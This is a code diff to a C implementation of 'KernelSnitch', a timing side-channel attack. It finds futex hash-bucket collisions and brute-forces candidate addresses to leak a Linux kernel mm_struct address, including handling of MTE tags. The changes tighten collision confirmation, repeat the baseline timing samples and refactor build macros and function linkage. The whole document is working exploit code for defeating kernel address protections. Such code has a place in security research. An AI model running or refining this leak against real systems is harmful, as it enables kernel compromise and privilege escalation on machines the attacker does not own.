@@ -73,12 +73,12 @@ struct kernelsnitch_shared_state {
     pthread_t *increase_tids;
     size_t increase_count;
     size_t increase_id;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
     size_t identity_start;
     size_t identity_end;
 #endif
     size_t identity_diff;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
     size_t min_object_index;
     size_t max_object_index;
     int exact_identity_partition;
@@ -218,7 +218,7 @@ static void *__mm_leak(void *arg)
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
         size_t coarse_end = coarse_addr + COARSE_SZ;
         if (ks->exact_identity_partition && coarse_end > range->end)
             coarse_end = range->end;
@@ -248,7 +248,7 @@ static void *__mm_leak(void *arg)
                 } else {
                     // need to set the tag if mte is enabled
                     for (size_t tag_candidate = 0;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
                          tag_candidate < 16 && !ks->found;
 #else
                          tag_candidate < 15 && !ks->found;
@@ -289,7 +289,7 @@ static void *__mm_leak(void *arg)
  * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
  * @return shared KernelSnitch state
  */
-struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
+static inline struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
 {
     struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->mm_struct = -1;
@@ -312,7 +312,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
     for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
         SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
     ks->identity_start = IDENTITY_START;
     ks->identity_end = IDENTITY_END;
     ks->identity_diff =
@@ -341,7 +341,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     return ks;
 }
 
-void kernelsnitch_set_profile(
+static inline void kernelsnitch_set_profile(
     struct kernelsnitch_shared_state *ks, size_t appended_futexes,
     size_t repeat_measurement, size_t average)
 {
@@ -356,8 +356,8 @@ void kernelsnitch_set_profile(
     ks->average = average;
 }
 
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-void kernelsnitch_set_search_bounds(
+#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
+static inline void kernelsnitch_set_search_bounds(
     struct kernelsnitch_shared_state *ks, size_t identity_start,
     size_t identity_end, size_t min_object_index, size_t max_object_index,
     int exact_identity_partition)
@@ -385,16 +385,14 @@ void kernelsnitch_set_search_bounds(
  * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
  * @arg ks: shared KernelSnitch state
  */
-void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
+static inline void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 {
     #define ID 128
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
-#define KERNELSNITCH_COLLISION_CONFIRMATIONS 1
-#endif
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
 #endif
     size_t count = 0;
     size_t wanted;
@@ -404,9 +402,16 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
-    size_t approx_time = MIN(
-        __measure(ks, (size_t)&ks->futexes[0]),
-        __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+#ifndef KERNELSNITCH_BASELINE_SAMPLES
+#define KERNELSNITCH_BASELINE_SAMPLES 8
+#endif
+    size_t approx_time = (size_t)-1;
+    for (int __b = 0; __b < KERNELSNITCH_BASELINE_SAMPLES; ++__b) {
+        size_t __s = MIN(
+            __measure(ks, (size_t)&ks->futexes[0]),
+            __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+        if (__s < approx_time) approx_time = __s;
+    }
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -423,7 +428,6 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
             int confirmed = 1;
             for (size_t confirmation = 1;
                  confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
@@ -436,7 +440,6 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             }
             if (!confirmed)
                 continue;
-#endif
             count++;
             ks->futex_addrs[count] = futex_addr;
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
@@ -446,12 +449,12 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
-        pr_warning("only found %zd collisions -> cannot continue\n", count);
+        pr_warning("only found %zd collisions, retry\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
     __decrease(ks);
 }
-size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
+static inline size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
     return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
@@ -461,7 +464,7 @@ size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
  * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
  * @arg ks: shared KernelSnitch state
  */
-void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
+static inline void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
     if (ks->verbose) pr_info("start bruteforcing\n");
@@ -471,7 +474,7 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
         mm_leak_arg->ks = ks;
         mm_leak_arg->range.id = i;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
         mm_leak_arg->range.start =
             ks->identity_start + ks->identity_diff*i;
         mm_leak_arg->range.end = i + 1 == ks->thread_cnt
@@ -511,7 +514,7 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
  * @arg ks: shared KernelSnitch state
  * @return the found mm_struct or -1 for not found
  */
-size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
+static inline size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
     munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
